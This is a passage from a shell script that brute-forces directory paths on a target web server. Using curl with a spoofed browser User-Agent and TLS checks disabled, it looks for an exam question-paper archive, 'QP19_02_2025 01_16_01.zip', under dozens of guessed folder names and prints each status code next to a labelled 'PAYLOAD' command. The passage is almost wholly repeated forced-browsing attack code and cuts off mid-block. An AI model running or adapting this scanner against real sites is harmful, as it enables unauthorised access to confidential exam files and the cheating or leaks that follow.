" "${target}ControlQPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ControlQPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataProcessing-QPSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataProcessing-QPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataProcessing-QPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPProcessingAccessControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPProcessingAccessControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPProcessingAccessControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMaster_Management/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMaster_Management/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMaster_Management/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [CloudSync-TestPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}CloudSync-TestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}CloudSync-TestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QstnPaper-Control/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QstnPaper-Control/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QstnPaper-Control/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPB_Module/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPB_Module/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPB_Module/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Sync_QPaperDoc/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Sync_QPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Sync_QPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBFile_Automation/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBFile_Automation/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBFile_Automation/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [System_QPUploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}System_QPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}System_QPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Automation-QPControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Automation-QPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Automation-QPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [TransferQPSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}TransferQPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}TransferQPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaper-Admin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaper-Admin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaper-Admin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Module_QPSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Module_QPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Module_QPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaper-Workflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaper-Workflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaper-Workflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Module-Q_P/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Module-Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Module-Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Manager_ExamPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Manager_ExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Manager_ExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Panel_QPUploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Panel_QPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Panel_QPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Manager-QP/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Manager-QP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Manager-QP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [HandlingModuleQPDatabase/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}HandlingModuleQPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}HandlingModuleQPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaper-Processing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaper-Processing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaper-Processing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Q_P_Automation/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Q_P_Automation/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Q_P_Automation/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploaderPlatform/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploaderPlatform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploaderPlatform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMasterTransfer/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMasterTransfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMasterTransfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataUpload_QPB/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataUpload_QPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataUpload_QPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBData-DataPipeline/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBData-DataPipeline/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBData-DataPipeline/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [UploadService-QPBulk/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}UploadService-QPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}UploadService-QPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [SyncQPHandler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}SyncQPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}SyncQPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ManagerExamPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ManagerExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ManagerExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAuto-FileUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAuto-FileUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAuto-FileUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDatabaseSuite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPDatabaseSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDatabaseSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploader_Uploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploader_Uploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploader_Uploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUpload-Ops/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUpload-Ops/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUpload-Ops/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QsnPaperAutomationSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QsnPaperAutomationSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QsnPaperAutomationSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPManager-FileUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPManager-FileUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPManager-FileUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataOpsQPBatch/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataOpsQPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataOpsQPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBData_DatabaseManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBData_DatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBData_DatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdminProcessingSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdminProcessingSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdminProcessingSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutomationSystem_QPMonitor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutomationSystem_QPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutomationSystem_QPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Automation_QPProcessing/QP19_02_2025%2001_16_01.zip]:"
